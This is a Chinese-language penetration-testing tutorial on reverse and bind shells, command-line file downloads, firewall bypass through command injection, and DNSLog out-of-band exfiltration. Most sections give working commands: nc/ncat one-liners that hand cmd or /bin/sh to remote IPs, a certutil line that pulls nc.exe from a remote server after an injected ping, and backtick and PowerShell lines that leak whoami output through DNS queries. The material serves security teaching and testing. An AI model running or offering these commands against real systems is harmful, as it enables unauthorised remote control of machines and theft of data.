# 005-基础入门-反弹SHELL&不回显带外&正反向连接&防火墙出入站&文件下载

![image-20250917234129185](https://img.yatjay.top/md/20250917234129252.png)

## 知识点

0、一点Linux基础知识：单引号、双引号和反引号

- 单引号（' '）

  - 单引号所见即所得，直接显示单引号里的内容。即单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的。

    ![img](https://img.yatjay.top/md/20250920171817293.jpeg)

- 双引号（" "）

  - 双引号则是先把变量解析之后，再输出。

  - 上面的例子中，使用双引号的时候，所见非所得，系统会先计算 `$TEST` 的值，然后再echo出来。

  - 双引号括起来的字符中，"$"、反斜杠（\）和反引号（\`\`）是拥有特殊含义的：

    - $ 代表引用变量的值；

    - \ 反斜杠是转义字符；

    - \`\` 反引号代表引用命令。

- 反引号（\` \`）

  - 反引号用于命令替换，即**先执行反引号中的语句，再把结果加入到原命令中**。

  - 反引号（`）位于键盘Tab键的上方、1键的左方。注意不要与单引号搞混。

  - 反引号的用法示例如下，先执行date命令，再将结果与字符串"date: "连起来，最后再echo出来。

    ![img](https://img.yatjay.top/md/20250920172036410.jpeg)

1、渗透命令-常规命令&文件上传下载

2、反弹Shell-防火墙策略&正反向连接

3、数据回显-查询带外&网络协议层级

## 演示案例

### 实用案例1：文件上传下载-解决无图形化和无数据传输的问题

安全测试时，可能只有命令行工具，而没有浏览器+url进行上传下载操作，本案例学习命令行进行上传下载操作，解决数据传输问题

工具：[棱角社区文件下载命令在线生成](https://forum.ywhack.com/bountytips.php?download)

![image-20250917235416913](https://img.yatjay.top/md/20250917235416971.png)

Linux：使用wget、curl、python、ruby、perl、java等相关命令下载

Windows：使用PowerShell、Certutil、Bitsadmin、msiexec、mshta、rundll32等相关命令下载

### 实用案例2：反弹Shell命令-解决无数据回显和数据通讯问题

数据回显问题：渗透测试时，执行命令之后需要查看命令回显，但有时回显内容无法传回，比如在一个网页上向目标服务器注入命令，网页无法传回命令回显内容，这时就需要反弹shell。反弹shell就是让被攻击机主动连你，把命令行的输入输出转移到其它主机

数据通讯问题：由于NAT、防火墙安全策略等配置，攻击者想要向目标内网侧服务器传输数据是比较困难的，但内网侧服务器向外发送数据是比较容易的，此时可以使目标内网侧服务器反弹shell至攻击者，实现数据传输

> [反弹bash shell命令详解](https://www.cnblogs.com/pandana/p/16289320.html)
>
> 反弹shell(reverse shell)，就是控制端(攻击者所有)监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转发到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念上的客户端与服务端的角色反转。
>
> 就我个人对反弹shell的理解是：
>
> 在Linux中的shell是指一个面向用户的命令接口，也就是一个命令解析器。用户可以通过在shell上键入命令来达到操作主机的目的。正常情况下shell只能由主机的用户使用，但是反弹shell的目的则是将自己的shell反弹给别的主机，让别的主机可以通过shell来控制自己。
>
> **简言而知，就是将目标主机的标准输入、标准输出、错误输出全都重定向到攻击端上**

工具：nc，nc程序是Linux自带，Windows不自带需要自行下载(上传)

工具：[棱角社区反弹shell在线生成](https://forum.ywhack.com/shell.php)

![image-20250917235502667](https://img.yatjay.top/md/20250917235502727.png)

如下图所示内网环境，若攻击者需要和内网环境中的目标服务器通信，由于网络配置或安全策略限制，控制端无法主动连接到内网服务器，此时就需要内网服务器反弹shell

![image-20250918223531650](https://img.yatjay.top/md/20250918223531695.png)

#### 正向连接：本地监听等待对方连接

##### Linux主动控制Windows

绑定CMD到本地5566端口，即将cmd运行至本地5566端口并监听

```cmd
nc -e cmd -lvp 5566
```

![image-20250918223854585](https://img.yatjay.top/md/20250918223854624.png)

使用Linux主动连接目标主机的5566端口，即可控制Windows主机

```cmd
ncat 47.122.23.131 5566
```

![image-20250918224005100](https://img.yatjay.top/md/20250918224005160.png)

##### Windows主动控制Linux

绑定SSH到本地5566端口，即将bash运行至本地5566端口并监听

```cmd
ncat -e /bin/sh -lvp 5566
```

![image-20250918224239917](https://img.yatjay.top/md/20250918224239964.png)

使用Windows主动连接目标5566端口，即可控制Linux主机

```cmd
nc 47.94.236.117 5566
```

![image-20250918224312991](https://img.yatjay.top/md/20250918224313025.png)

#### 反向连接：主动给出去，对方监听

##### Windows主动给出cmd

绑定Windows主机的CMD到目标主机的5566端口

```cmd
nc -e cmd 47.94.236.117 5566
```

在目标主机上，监听5566端口，即等待5566连接

```cmd
ncat -lvvp 5566
```

##### Linux主动给出bash

绑定Linux主机的bash到目标主机的5566端口

```cmd
ncat -e /bin/sh 47.122.23.131 5566
```

该命令含义是：使用ncat连接到IP地址为`47.122.23.131`的5566端口，并且在连接建立后，在该主机上执行`/bin/sh`，从而让远程客户端能够通过这个连接发送shell命令并接收输出

![image-20250918225426838](https://img.yatjay.top/md/20250918225426881.png)

在目标主机上，监听5566端口，即等待5566连接

```cmd
nc -lvvp 5566
```

![image-20250918225444767](https://img.yatjay.top/md/20250918225444816.png)

##### 笔者测试反弹shell

已知云服务器IP为x.x.x.x，将本地Windows主机的cmd反弹至云服务器的5566端口

![image-20250918234120615](https://img.yatjay.top/md/20250918234120664.png)

在云服务器一侧，要确保云服务器安全组策略放开且系统软防火墙服务关闭或放行5566端口，然后监听本地5566端口。连接建立后，可以向Windows主机执行cmd命令，下图是执行dir命令的回显。经过确认，图中显示的`171.217.42.215`正是笔者的公网IP地址

这里笔者的反弹shell测试当中，Windows主机正是一个内网环境的设备，它需要主动向外网控制端主机给出cmd，才能继续进行测试。

![image-20250918233829161](https://img.yatjay.top/md/20250918233829214.png)

### 实际案例1：防火墙绕过-正向连接&反向连接&内网服务器

![image-20250918234837687](https://img.yatjay.top/md/20250918234837730.png)

#### 利用管道符等方法执行多条命令

管道符：

- | (管道符号) 
- ||（逻辑或） 
- &&（逻辑与）  
- &(后台任务符号)

其中

- Windows系统使用：| & || &&
- Linux系统使用：; | || & && \`\`(特有\`\`和;)

例子：

```cmd
ping -c 1 127.0.0.1 ; whoami
ping -c 1 127.0.0.1 | whoami
ping -c 1 127.0.0.1 || whoami
ping -c 1 127.0.0.1 & whoami
ping -c 1 127.0.0.1 && whoami
ping -c 1 127.0.0.1 `whoami`
```

#### 利用管道符执行多条命令将shell反弹至控制端

假设目标主机是一个Windows服务器，则反弹shell操作如下

##### 判断操作系统

判断windows：如执行whoami返回administrator可以确定是Windows服务器

##### 判断有误nc程序

windows没有自带的nc：nc命令无法执行

##### 想办法上传nc 反弹权限

想办法上传nc 反弹权限：使用上面所述的下载命令，将nc.exe下载至目标主机。控制端可以提前将nc客户端放到自己的一个服务器上，再在目标主机上使用命令下载至目标主机本地

```cmd
//将远程主机上的nc程序下载到目标主机本地
ping 127.0.0.1|certutil.exe -urlcache -split -f http://47.94.236.117:80/nc.exe C:\\nc.exe 
```

![image-20250919000822933](https://img.yatjay.top/md/20250919000822988.png)

##### 反弹shell

反弹shell：在目标主机上执行nc程序，将shell反弹至控制端

###### 若目标主机防火墙开启出站策略(检查出站流量)，则采用正向连接

假设防火墙出站策略限制5566端口，那么采取正向连接方式，则目标主机先将自己的cmd绑定至本地5566端口

```cmd
ping 127.0.0.1 | nc -e cmd -lvvp 5566
```

然后使用控制端连接该服务

```cmd
ncat -e cmd 47.122.23.131 5566
```

###### 若目标主机防火墙若开启入站策略(检查入站流量)，则采用反向连接

假设防火墙入站策略限制5566端口，那么采取反向连接方式，则目标主机先将自己的cmd反弹交给控制端

```cmd
ping 127.0.0.1 | nc -e cmd 47.94.236.117 5566
```

然后控制端监听自己的5566端口

```cmd
ncat -lvvp 5566
```

**一般地，防火墙入站策略较为严格，出站策略较为宽松，因此反弹shell很常用**

Windows的防火墙配置在这里

![image-20250920164707521](https://img.yatjay.top/md/20250920164707589.png)

### 实际案例2：防火墙组合数据不回显-ICMP带外查询Dnslog

若存在命令注入漏洞，但是命令不回显，除了可以使用上述的反弹shell操作外，还可以使用**带外查询**，如DNSLog，在线DNSLog平台可以搜到

DNSLog回显的核心原理是：**利用DNS协议，将漏洞点携带的敏感信息作为子域名发出查询请求，最终被外部的DNS日志记录平台捕获并显示。** 测试者通过查看该平台的日志记录，即可间接获取到漏洞执行的结果或证明漏洞存在。DNS在解析的时候会留下日志，我们将信息放在高级域名中，传递到自己这里，然后通过读日志获取信息。(笔者注：DNS解析的过程是递归或迭代，最终会找到我们提前配置好的DNS主机)

比如，我们在DNSLog平台https://dig.pm/获取到一个可供自己使用的子域名`c02539d19c.ddns.1433.eu.org.`

当在本地ping该子域名时，该平台就会得到一条记录；当在该子域名前添加内容再ping时，记录也显示了我们添加的内容，如下图所示。因此借助这一特性，可以将命令执行结果外带至DNSLog平台

![image-20250920173321521](https://img.yatjay.top/md/20250920173321576.png)

#### Linux主机：利用反引号特性将命令结果外带

对于Linux主机，由于反引号在执行命令时的特性(即**先执行反引号中的语句，再把结果加入到原命令中**)，可以将命令结果外带。如在一个Linux主机执行下面命令

```bash
ping `whoami`.5d8f10b7b9.ddns.bypass.eu.org.
```

得到DNSLog记录中可以看到whami的执行结果为root

![image-20250920174356822](https://img.yatjay.top/md/20250920174356871.png)

#### Windows主机，使用powershell脚本+变量赋值将结果外带

对于Windows主机，就无法使用反引号了，而需要使用**powershell脚本+变量赋值**的形式来执行，比如

```cmd
ping 127.0.0.1 | powershell $x=whoami;$x=$x.Replace('\','xxx');$y='.f4an93.dnslog.cn';$z=$x+$y;ping $z
```

这行命令由两部分通过管道 `|`连接而成，在PowerShell部分：

```bash
$x=whoami;          // 执行whoami命令，将结果赋值给变量$x。例如，结果可能是"domain\user"或"computer\user"。
$x=$x.Replace('\','xxx');      // 将$x中的反斜杠'\'替换为'xxx'。这是因为域名中不允许有反斜杠，所以需要替换掉。例如，"domain\user"变成"domainxxxuser"。
$y='.f4an93.dnslog.cn';      // 定义一个字符串，是攻击者控制的DNSLog域名。
$z=$x+$y;                          // 将处理后的用户名和DNSLog域名拼接起来，形成一个新的域名。例如，"domainxxxuser.f4an93.dnslog.cn"。
ping $z     // 对拼接后的域名执行ping命令。ping命令会尝试解析这个域名，从而向DNS服务器发起查询。攻击者可以在DNSLog平台上看到这个查询记录，从而得知whoami的结果
```

所以，整个命令的目的是：获取当前用户名，并将用户名通过DNS查询外带出来。

为什么要这样写

- cmd无法执行whoami
- 用到powershell+变量赋值，把whoami执行结果给变量
- 结果中带有“\” 会导致ping无法执行

笔者自行使用Windows主机测试如下

```cmd
ping 127.0.0.1 | powershell $x=whoami;$x=$x.Replace('\','xxx');$y='.5d8f10b7b9.ddns.bypass.eu.org.';$z=$x+$y;ping $z
```

可见带出了whoami执行结果

![image-20250920180136113](https://img.yatjay.top/md/20250920180136160.png)

实际上，ping命令外带可以绕过防火墙限制，一般地，防火墙在TCP/UDP即传输层进行过滤，ping命令的ICMP不受限制，而DNS解析作为必要，防火墙一般会放开DNS协议

 



